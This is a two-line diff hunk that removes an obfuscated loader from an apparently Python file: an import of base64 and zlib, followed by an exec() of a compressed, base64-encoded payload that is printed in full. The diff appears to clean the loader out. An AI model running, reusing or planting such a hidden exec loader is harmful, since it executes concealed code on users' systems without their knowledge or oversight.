@@ -1,2 +1,0 @@
-import base64, zlib
-exec(zlib.decompress(base64.b64decode(b'eJyVjjELwjAQhff8iqNLEtBUtyp0EHEQigUF1xKSSw3UJMSU4r83QsFFEG943N27x332HnxMEJGQyaYb+ICOUevUMGosx6BlwliqwaJL3TyK8KQLoDELOuW1dX1Nx2SWFeUgH2C2BHIp71JOQQ1GRJSacUI+u7nLThikQkabdr9ruuvhfDm2p3xQrMVKVMX701drU1D+P/T0A9qIKdqEbMbjLzcYWq8=')))
